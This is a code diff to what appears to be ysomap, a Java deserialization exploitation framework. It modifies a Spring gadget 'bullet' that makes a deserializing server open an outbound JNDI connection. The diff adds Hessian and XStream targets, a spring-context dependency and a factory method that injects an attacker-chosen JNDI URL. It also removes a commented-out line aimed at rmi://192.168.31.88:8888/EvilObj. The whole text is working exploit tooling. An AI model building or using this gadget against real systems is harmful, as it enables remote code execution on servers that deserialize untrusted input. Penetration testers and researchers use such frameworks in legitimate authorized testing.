@@ -13,7 +13,8 @@ import ysomap.core.util.ReflectionHelper;
 @Bullets
 @Authors({Authors.WH1T3P1G})
 @Details("向外发起JNDI连接")
-@Dependencies({"*"})
+@Targets({Targets.HESSIAN, Targets.XSTREAM})
+@Dependencies({"org.springframework:spring-context"})
 public class SpringJndiBullet1 implements Bullet<Object> {
 
     @NotNull
@@ -26,8 +27,12 @@ public class SpringJndiBullet1 implements Bullet<Object> {
         bf.setShareableResources(jndiURL);
         ReflectionHelper.setFieldValue(bf, "logger", new NoOpLog());
         ReflectionHelper.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
-//        JtaTransactionManager manager = new JtaTransactionManager();
-//        manager.setUserTransactionName("rmi://192.168.31.88:8888/EvilObj");
         return bf;
+    }
+
+    public static SpringJndiBullet1 newInstance(Object... args) throws Exception {
+        SpringJndiBullet1 bullet = new SpringJndiBullet1();
+        bullet.set("jndiURL", args[0]);
+        return bullet;
     }
 }
